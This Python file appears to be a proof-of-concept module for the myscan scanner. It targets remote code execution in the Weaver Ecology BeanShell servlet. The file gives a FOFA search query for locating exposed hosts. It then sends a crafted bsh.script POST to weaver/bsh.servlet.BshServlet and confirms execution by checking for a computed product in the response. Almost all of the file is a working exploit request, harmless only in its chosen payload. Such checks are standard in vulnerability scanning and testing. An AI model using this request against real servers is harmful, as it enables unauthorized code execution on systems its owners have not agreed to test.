#!/usr/bin/env python3
# @Time    : 2020-05-24
# @Author  : caicai
# @File    : poc_ecology-javabeanshell-rce_2019.py

'''fofa :header="ecology_JSessionId" '''
# 此脚本为编写perfloder的poc模板，编写poc时复制一份此模版为pocname即可，用户可在verify方法下添加自己代码
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set
import random


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "ecology-javabeanshell-rce"
        self.vulmsg = "referer:https://www.weaver.com.cn/cs/securityDownload.asp"
        self.level = 3  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        rand1 = random.randint(40000, 44800)
        rand2 = random.randint(40000, 44800)
        req = {
            "method": "POST",
            "url": self.url + "weaver/bsh.servlet.BshServlet",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
            },
            "data": "bsh.script=print%28{}*{}%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw".format(rand1,
                                                                                                               rand2),
            "timeout": 10,
            "allow_redirects": False,
            "verify": False,
        }
        r = request(**req)
        if r != None and r.status_code == 200 and (str(rand1 * rand2)).encode() in r.content:
            parser_ = response_parser(r)
            self.result.append({
                "name": self.name,
                "url": parser_.geturl(),
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "request": parser_.getrequestraw(),
                    "response": parser_.getresponseraw()
                }
            })
